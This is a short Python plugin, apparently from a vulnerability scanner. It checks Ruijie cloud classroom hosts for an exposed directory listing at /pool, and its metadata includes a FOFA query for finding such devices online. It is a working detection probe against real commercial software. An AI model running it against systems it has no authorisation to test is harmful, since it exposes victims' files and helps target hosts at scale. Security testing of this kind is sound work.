#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '锐捷 云课堂主机 pool 目录遍历',

      'level'     :   'medium',

      'FOFA'      :   'title="Ruijie" && "云课堂主机"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/2/26',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/pool'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'Directory Listing For /',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret